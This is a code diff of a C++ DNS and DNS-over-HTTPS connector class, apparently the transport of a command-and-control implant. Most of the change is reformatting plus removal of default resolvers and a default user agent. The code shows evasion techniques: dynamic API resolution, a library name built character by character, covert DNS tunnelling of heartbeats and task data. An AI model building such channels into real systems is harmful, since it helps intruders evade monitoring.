@@ -37,21 +37,21 @@ ConnectorDNS::ConnectorDNS()
     if (!this->functions)
         return;
 
-    this->functions->LocalAlloc = ApiWin->LocalAlloc;
-    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
-    this->functions->LocalFree = ApiWin->LocalFree;
-    this->functions->WSAStartup = ApiWin->WSAStartup;
-    this->functions->WSACleanup = ApiWin->WSACleanup;
-    this->functions->socket = ApiWin->socket;
-    this->functions->closesocket = ApiWin->closesocket;
-    this->functions->sendto = ApiWin->sendto;
-    this->functions->recvfrom = ApiWin->recvfrom;
-    this->functions->select = ApiWin->select;
+    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
+    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
+    this->functions->LocalFree     = ApiWin->LocalFree;
+    this->functions->WSAStartup    = ApiWin->WSAStartup;
+    this->functions->WSACleanup    = ApiWin->WSACleanup;
+    this->functions->socket        = ApiWin->socket;
+    this->functions->closesocket   = ApiWin->closesocket;
+    this->functions->sendto        = ApiWin->sendto;
+    this->functions->recvfrom      = ApiWin->recvfrom;
+    this->functions->select        = ApiWin->select;
     this->functions->gethostbyname = ApiWin->gethostbyname;
-    this->functions->Sleep = ApiWin->Sleep;
-    this->functions->GetTickCount = ApiWin->GetTickCount;
-    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
-    this->functions->GetLastError = ApiWin->GetLastError;
+    this->functions->Sleep         = ApiWin->Sleep;
+    this->functions->GetTickCount  = ApiWin->GetTickCount;
+    this->functions->LoadLibraryA  = ApiWin->LoadLibraryA;
+    this->functions->GetLastError  = ApiWin->GetLastError;
 
     // Initialize DoH functions structure
     this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
@@ -127,16 +127,16 @@ BOOL ConnectorDNS::InitDoH()
 
     // Load wininet.dll
     CHAR wininet_c[12];
-    wininet_c[0]  = 'w';
-    wininet_c[1]  = 'i';
-    wininet_c[2]  = 'n';
-    wininet_c[3]  = 'i';
-    wininet_c[4]  = 'n';
-    wininet_c[5]  = 'e';
-    wininet_c[6]  = 't';
-    wininet_c[7]  = '.';
-    wininet_c[8]  = 'd';
-    wininet_c[9]  = 'l';
+    wininet_c[0] = 'w';
+    wininet_c[1] = 'i';
+    wininet_c[2] = 'n';
+    wininet_c[3] = 'i';
+    wininet_c[4] = 'n';
+    wininet_c[5] = 'e';
+    wininet_c[6] = 't';
+    wininet_c[7] = '.';
+    wininet_c[8] = 'd';
+    wininet_c[9] = 'l';
     wininet_c[10] = 'l';
     wininet_c[11] = 0;
 
@@ -158,13 +158,7 @@ BOOL ConnectorDNS::InitDoH()
     if (!this->dohFunctions->InternetOpenA || !this->dohFunctions->HttpSendRequestA)
         return FALSE;
 
-    // Create Internet handle with user agent from profile
     CHAR* userAgent = (CHAR*)this->profile.user_agent;
-    if (!userAgent || !userAgent[0]) {
-        // Default user agent if not configured (same as HTTP listener default)
-        static CHAR defaultUserAgent[] = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0";
-        userAgent = defaultUserAgent;
-    }
     this->hInternet = this->dohFunctions->InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!this->hInternet)
         return FALSE;
@@ -238,8 +232,10 @@ void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
                 info->port = info->port * 10 + (*pathStart - '0');
                 pathStart++;
             }
-            if (info->port == 0) info->port = 443;
-        } else {
+            if (info->port == 0)
+                info->port = 443;
+        }
+        else {
             CHAR savedPath = *pathStart;
             *pathStart = '\0';
             StrLCopyA(info->host, hostStart, sizeof(info->host));
@@ -247,29 +243,18 @@ void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
         }
 
         // Copy path (default to /dns-query)
-        if (*pathStart == '/') {
+        if (*pathStart == '/')
             StrLCopyA(info->path, pathStart, sizeof(info->path));
-        } else {
+        else
             StrLCopyA(info->path, "/dns-query", sizeof(info->path));
-        }
 
-        if (info->host[0]) {
+        if (info->host[0])
             this->dohResolverCount++;
-        }
 
         if (savedChar) {
             *p = savedChar;
             p++;
         }
-    }
-
-    // Add default resolvers if none specified
-    if (this->dohResolverCount == 0) {
-        // Google
-        StrLCopyA(this->dohResolverList[0].host, "dns.google", sizeof(this->dohResolverList[0].host));
-        StrLCopyA(this->dohResolverList[0].path, "/dns-query", sizeof(this->dohResolverList[0].path));
-        this->dohResolverList[0].port = 443;
-        this->dohResolverCount = 1;
     }
 }
 
@@ -457,32 +442,16 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
         return FALSE;
 
     // Connect to DoH server
-    HINTERNET hConnect = this->dohFunctions->InternetConnectA(
-        this->hInternet,
-        resolver->host,
-        resolver->port,
-        NULL, NULL,
-        INTERNET_SERVICE_HTTP,
-        0, 0
-    );
+    HINTERNET hConnect = this->dohFunctions->InternetConnectA( this->hInternet, resolver->host, resolver->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0 );
     if (!hConnect)
         return FALSE;
 
     // Open POST request
     CHAR acceptTypes[] = "application/dns-message";
     LPCSTR rgpszAcceptTypes[] = { acceptTypes, NULL };
-    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | 
-                  INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;
+    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;
 
-    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA(
-        hConnect,
-        "POST",
-        resolver->path,
-        NULL, NULL,
-        rgpszAcceptTypes,
-        flags,
-        0
-    );
+    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA( hConnect, "POST", resolver->path, NULL, NULL, rgpszAcceptTypes, flags, 0 );
     if (!hRequest) {
         this->dohFunctions->InternetCloseHandle(hConnect);
         return FALSE;
@@ -500,14 +469,7 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
     CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";
 
     // Send request with DNS query as body
-    BOOL sendOk = this->dohFunctions->HttpSendRequestA(
-        hRequest,
-        headers,
-        (DWORD)-1,
-        (LPVOID)dnsQuery,
-        queryLen
-    );
-
+    BOOL sendOk = this->dohFunctions->HttpSendRequestA( hRequest, headers, (DWORD)-1, (LPVOID)dnsQuery, queryLen );
     BOOL result = FALSE;
     if (sendOk) {
         // Check status code
@@ -536,7 +498,8 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
                         totalRead += bytesRead;
                         if (bytesRead == 0)
                             break;
-                    } else {
+                    }
+                    else {
                         break;
                     }
                 }
@@ -654,22 +617,15 @@ void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
         this->resolverDisabledUntil[i] = 0;
     }
 
-    if (resolvers && resolvers[0]) {
-        StrLCopyA(this->rawResolvers, resolvers, sizeof(this->rawResolvers));
-        CHAR* p = this->rawResolvers;
-        while (*p && this->resolverCount < kMaxResolvers) {
-            while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
-            if (!*p) break;
-            this->resolverList[this->resolverCount++] = p;
-            while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
-            if (*p) *p++ = '\0';
-        }
-    }
-
-    if (this->resolverCount == 0) {
-        StrLCopyA(this->rawResolvers, "8.8.8.8", sizeof(this->rawResolvers));
-        this->resolverList[0] = this->rawResolvers;
-        this->resolverCount = 1;
+    StrLCopyA(this->rawResolvers, resolvers, sizeof(this->rawResolvers));
+    CHAR* p = this->rawResolvers;
+    while (*p && this->resolverCount < kMaxResolvers) {
+        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
+        if (!*p)
+            break;
+        this->resolverList[this->resolverCount++] = p;
+        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
+        if (*p) *p++ = '\0';
     }
 }
 
@@ -761,7 +717,7 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     if (s == INVALID_SOCKET)
         return FALSE;
 
-    const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "8.8.8.8";
+    const CHAR* resolver = resolverIP;
 
     HOSTENT* he = this->functions->gethostbyname(resolver);
     if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
@@ -1174,7 +1130,7 @@ void ConnectorDNS::SendHeartbeat()
     else {
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
-        
+
         if (this->consecutiveFailures >= 5) {
             this->hasPendingTasks = FALSE;
             this->downAckOffset = 0;
@@ -1440,7 +1396,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         else {
             this->lastQueryOk = FALSE;
             this->consecutiveFailures++;
-            
+
             if (this->consecutiveFailures >= 5) {
                 this->hasPendingTasks = FALSE;
             }
@@ -1672,7 +1628,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         // GET request failed - increment failure counter
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
-        
+
         if (this->consecutiveFailures >= 5) {
             this->hasPendingTasks = FALSE;
             this->downAckOffset = 0;
